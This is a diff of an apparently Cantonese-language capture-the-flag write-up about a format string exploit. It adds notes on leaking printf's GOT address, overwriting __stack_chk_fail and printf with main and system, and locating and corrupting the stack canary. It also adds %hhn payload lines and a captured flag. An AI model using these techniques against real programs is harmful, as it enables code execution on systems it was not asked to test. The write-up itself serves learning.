@@ -30,7 +30,7 @@
 
 ![alt text](3.png)
 
-不過直接讀只會出返個所以要再
+不過由於直接讀%71$p 只會出返個printf got address,所以要send 70個%, 再dereference 71號位by %s 
 
 ```python
 #dereference by %s
@@ -41,20 +41,27 @@ printf_addr=int(r.recv(1024).split('--')[-1][:4][::-1].encode('hex'),16)
 
 ```
 
-之後就寫做
+之後就寫stack_check_fail做main,寫printf做system
 
 
 
+最後一步,寫canary
+
+![alt text](2.png)
 
 
-
-最後一步
-
-
-一眼就見到號位有個近似嘅物體
+係stack dump一眼就見到139號位有個近似stack address嘅物體
 
 
-減返跳去canary($ebp-0x1c)
+於是用local 139 save個個address 減返canary($ebp-0x1c)
+
+得到 0x34
+
+
+send %139$p 求server side 139 stored address,
+
+
+canary: 0xffffdd9c=0xffffddd0-0x34
 
 
 
@@ -83,7 +90,9 @@ payload+=p32(printf_got+3)
 
 payload+=p32(0xffffdd9c)
 
-fmt= '%188c%71$hhn'# 0xe0-36=
+#36 is the length of the payload above
+
+fmt= '%188c%71$hhn'# 0xe0-36=188  writen to position 71
 fmt+='%164c%72$hhn'# 0x84-0xe0=
 fmt+='%128c%73$hhn'# 0x04-0x84=
 fmt+='%4c%74$hhn'# 0x08-0x04
@@ -103,6 +112,14 @@ fmt+='%11c%79$hhn'
 加上canary頭一個byte係 \x00,所以求其寫d非0嘅野上去已經可以corrupt佢
 
 
+# Flag:
+![alt text](megan.png)
+
+```
+flag{43eb404b714b8d22e1168775eba1669c}
+```
+
+慘
 
 
 Reference
